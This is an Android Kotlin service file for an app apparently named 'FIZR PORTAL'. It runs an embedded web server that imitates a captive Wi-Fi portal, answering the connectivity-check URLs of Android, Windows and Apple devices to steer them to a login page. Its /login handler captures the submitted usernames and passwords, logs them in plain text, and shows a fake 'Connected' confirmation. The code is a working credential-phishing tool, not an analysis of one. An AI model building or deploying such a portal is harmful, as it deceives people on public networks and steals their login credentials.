package com.fizr.portal.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import androidx.lifecycle.LifecycleService
import com.fizr.portal.MainActivity
import com.fizr.portal.R
import com.fizr.portal.manager.HtmlManager
import fi.iki.elonen.NanoHTTPD
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

// ── Shared state (ViewModel observes these) ──────────────────────────────────

data class LogEntry(
    val timestamp: String,
    val method: String,
    val uri: String,
    val detail: String = "",
)

object ServerState {
    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _port = MutableStateFlow(8080)
    val port: StateFlow<Int> = _port.asStateFlow()

    private val _logs = MutableStateFlow<List<LogEntry>>(emptyList())
    val logs: StateFlow<List<LogEntry>> = _logs.asStateFlow()

    private val _useCustomHtml = MutableStateFlow(false)
    val useCustomHtml: StateFlow<Boolean> = _useCustomHtml.asStateFlow()

    fun setRunning(v: Boolean) { _isRunning.value = v }
    fun setPort(v: Int)        { _port.value = v }
    fun setUseCustom(v: Boolean) { _useCustomHtml.value = v }

    fun addLog(entry: LogEntry) {
        _logs.update { current ->
            (listOf(entry) + current).take(200) // keep latest 200 entries
        }
    }

    fun clearLogs() { _logs.value = emptyList() }
}

// ── Embedded HTTP server (NanoHTTPD) ─────────────────────────────────────────

class CaptivePortalServer(
    port: Int,
    private val htmlManager: HtmlManager,
) : NanoHTTPD(port) {

    private val timeFmt = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

    override fun serve(session: IHTTPSession): Response {
        val uri    = session.uri
        val method = session.method.name
        val time   = timeFmt.format(Date())

        return when {
            // ── Captive-portal probe endpoints ───────────────────────────
            uri == "/generate_204" || uri == "/gen_204" -> {
                ServerState.addLog(LogEntry(time, method, uri, "Captive probe → redirect"))
                newFixedLengthResponse(Response.Status.REDIRECT_SEE_OTHER, MIME_PLAINTEXT, "").also {
                    it.addHeader("Location", "/")
                }
            }

            uri == "/connecttest.txt" -> {
                ServerState.addLog(LogEntry(time, method, uri, "Windows connectivity check"))
                newFixedLengthResponse(Response.Status.OK, MIME_PLAINTEXT, "Microsoft Connect Test")
            }

            uri == "/ncsi.txt" -> {
                ServerState.addLog(LogEntry(time, method, uri, "NCSI check"))
                newFixedLengthResponse(Response.Status.OK, MIME_PLAINTEXT, "Microsoft NCSI")
            }

            uri.startsWith("/hotspot-detect") || uri == "/library/test/success.html" -> {
                ServerState.addLog(LogEntry(time, method, uri, "Apple captive probe → redirect"))
                newFixedLengthResponse(Response.Status.REDIRECT_SEE_OTHER, MIME_PLAINTEXT, "").also {
                    it.addHeader("Location", "/")
                }
            }

            // ── Login form POST ───────────────────────────────────────────
            uri == "/login" && method == "POST" -> {
                val bodyMap = mutableMapOf<String, String>()
                session.parseBody(bodyMap)
                val params = session.parameters
                val user   = params["username"]?.firstOrNull() ?: params["user"]?.firstOrNull() ?: "-"
                val pass   = params["password"]?.firstOrNull() ?: params["pass"]?.firstOrNull() ?: "-"

                ServerState.addLog(
                    LogEntry(time, method, uri, "LOGIN → user=$user | pass=$pass")
                )
                // Respond with a simple success page
                val html = """
                    <!DOCTYPE html><html><head><meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width,initial-scale=1">
                    <title>FIZR PORTAL – Connected</title>
                    <style>*{margin:0;padding:0;box-sizing:border-box}
                    body{background:#0a0a0a;color:#fff;font-family:sans-serif;
                         display:flex;align-items:center;justify-content:center;min-height:100vh}
                    .box{text-align:center;padding:2rem}
                    h1{color:#e53935;font-size:2rem;margin-bottom:.5rem}
                    p{color:#aaa;margin-top:.5rem}</style></head>
                    <body><div class="box">
                    <h1>✓ Connected</h1>
                    <p>You are now online.</p>
                    <p style="margin-top:1.5rem;font-size:.8rem;color:#555">FIZR PORTAL</p>
                    </div></body></html>
                """.trimIndent()
                newFixedLengthResponse(Response.Status.OK, "text/html; charset=UTF-8", html)
            }

            // ── Main page (GET /) ─────────────────────────────────────────
            uri == "/" || uri == "/index.html" -> {
                val html = htmlManager.getActiveHtml(ServerState.useCustomHtml.value)
                ServerState.addLog(LogEntry(time, method, uri, "Served portal page"))
                newFixedLengthResponse(Response.Status.OK, "text/html; charset=UTF-8", html)
            }

            // ── 404 fallback → redirect to portal ────────────────────────
            else -> {
                ServerState.addLog(LogEntry(time, method, uri, "Unknown path → redirect"))
                newFixedLengthResponse(Response.Status.REDIRECT_SEE_OTHER, MIME_PLAINTEXT, "").also {
                    it.addHeader("Location", "/")
                }
            }
        }
    }
}

// ── Foreground Service ────────────────────────────────────────────────────────

class WebServerService : LifecycleService() {

    private var server: CaptivePortalServer? = null
    private lateinit var htmlManager: HtmlManager

    companion object {
        const val ACTION_START = "com.fizr.portal.START"
        const val ACTION_STOP  = "com.fizr.portal.STOP"
        const val EXTRA_PORT   = "PORT"
        const val EXTRA_CUSTOM = "USE_CUSTOM"
        private const val NOTIF_CHANNEL = "fizr_portal_channel"
        private const val NOTIF_ID      = 1001
    }

    override fun onCreate() {
        super.onCreate()
        htmlManager = HtmlManager(applicationContext)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        when (intent?.action) {
            ACTION_START -> {
                val port      = intent.getIntExtra(EXTRA_PORT, 8080)
                val useCustom = intent.getBooleanExtra(EXTRA_CUSTOM, false)
                startServer(port, useCustom)
            }
            ACTION_STOP -> stopServer()
        }
        return START_NOT_STICKY
    }

    private fun startServer(port: Int, useCustom: Boolean) {
        stopServer()
        ServerState.setPort(port)
        ServerState.setUseCustom(useCustom)

        server = CaptivePortalServer(port, htmlManager).also { s ->
            s.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
        }
        ServerState.setRunning(true)
        startForeground(NOTIF_ID, buildNotification(port))
    }

    private fun stopServer() {
        server?.stop()
        server = null
        ServerState.setRunning(false)
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        server?.stop()
        server = null
        ServerState.setRunning(false)
        super.onDestroy()
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            NOTIF_CHANNEL,
            "FIZR PORTAL Server",
            NotificationManager.IMPORTANCE_LOW,
        ).apply { description = "Web server running indicator" }
        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
    }

    private fun buildNotification(port: Int): Notification {
        val tapIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE,
        )
        return Notification.Builder(this, NOTIF_CHANNEL)
            .setContentTitle("FIZR PORTAL — Running")
            .setContentText("Listening on port $port")
            .setSmallIcon(R.drawable.ic_server)
            .setContentIntent(tapIntent)
            .setOngoing(true)
            .build()
    }
}
